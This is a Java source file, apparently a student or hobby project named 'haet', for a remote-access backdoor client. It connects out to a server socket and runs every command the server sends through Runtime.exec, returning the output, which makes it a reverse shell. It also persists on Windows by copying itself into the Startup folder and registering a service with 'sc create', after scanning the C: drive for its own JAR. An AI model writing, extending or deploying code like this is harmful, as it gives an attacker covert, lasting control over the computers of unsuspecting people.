/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package haet;

import java.net.*;
import java.io.*;
import java.util.Scanner;
public class Cliente {
    private Socket socket;
    private DataInputStream bufferDeEntrada = null;
    private DataOutputStream bufferDeSalida = null;
    Scanner teclado = new Scanner(System.in);
    final String COMANDO_TERMINACION = "salir()";

    public void levantarConexion(String ip, int puerto) {
        try {
            socket = new Socket(ip, puerto);
            mostrarTexto("Conectado a :" + socket.getInetAddress().getHostName());
        } catch (Exception e) {
            mostrarTexto("Excepción al levantar conexión: " + e.getMessage());
            System.exit(0);
        }
    }

    public static void mostrarTexto(String s) {
        System.out.println(s);
    }

    public void abrirFlujos() {
        try {
            bufferDeEntrada = new DataInputStream(socket.getInputStream());
            bufferDeSalida = new DataOutputStream(socket.getOutputStream());
            bufferDeSalida.flush();
        } catch (IOException e) {
            mostrarTexto("Error en la apertura de flujos");
        }
    }

    public void enviar(String s) {
        try {
            bufferDeSalida.writeUTF(s);
            bufferDeSalida.flush();
        } catch (IOException e) {
            mostrarTexto("IOException on enviar");
        }
    }

    public void cerrarConexion() {
        try {
            bufferDeEntrada.close();
            bufferDeSalida.close();
            socket.close();
            mostrarTexto("Conexión terminada");
        } catch (IOException e) {
            mostrarTexto("IOException on cerrarConexion()");
        }finally{
            System.exit(0);
        }
    }

    public void ejecutarConexion(String ip, int puerto) {
        Thread hilo = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    levantarConexion(ip, puerto);
                    abrirFlujos();
                    recibirDatos();
                } finally {
                    cerrarConexion();
                }
            }
        });
        hilo.start();
    }

    public void recibirDatos() {
        String st = "";
        int sti = 0;
        try {
            do {                        
                st = (String) bufferDeEntrada.readUTF();
                escribirDatos(st);                                                            
            } while (!st.equals(COMANDO_TERMINACION));
        } catch (IOException e) {}
    }
    
    public void escribirDatos(String comando) {
        String entrada = "";
        Process p;
        try {
              System.err.println("COMANDO: " + comando);
              p = Runtime.getRuntime().exec(comando);
              p.waitFor();
              BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
              String line = "";
              while ((line = reader.readLine())!= null) {                  
                  enviar(line+"\n");
              }
              reader.close();
              
            } catch (Exception e) {
              e.printStackTrace();
            }                                    
        
    }    
    
    public void escribirDatos() {
        String entrada = "";
        while (true) {
            System.out.print("[Usted] => ");
            entrada = teclado.nextLine();
            if(entrada.length() > 0)
                enviar(entrada);
        }
    }    

    /**
     * Persiste de dos formas diferentes en el archivo StartUp y creando un servicio sc
     * @param location 
     */
    private void persistir(String location){          
        String locationJAR = "";        
        String locationCopy = "";        
        locationJAR = location; //+ "\\Cliente.jar";        
        locationCopy = "xcopy " + "\"" + location + "\" " + "\"" + "c:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp" + "\"" ;                        
        escribirDatos(locationCopy);        
        escribirDatos("sc create newservice binpath="+locationJAR);                                
        System.out.println("LO LOGRO");
    }
    
    public void findFile(String name,File file){        
        String location = "";
        File[] list = file.listFiles();        
        if(list!=null){
            for (File fil : list)
            {
                if (fil.isDirectory())
                {  
                    findFile(name,fil);
                }
                else if (name.equalsIgnoreCase(fil.getName()))
                {
                    location = fil.getParent();
                    System.out.println("PERSISTIR");
                    persistir(location);                                        
                }
            }
        }                 
    }
    
    public static void main(String[] argumentos) throws IOException {
    Cliente cliente = new Cliente();        
    cliente.ejecutarConexion("localhost", Integer.parseInt("5050"));
    cliente.findFile("Cliente.jar",new File("C:\\"));
    
    }
}
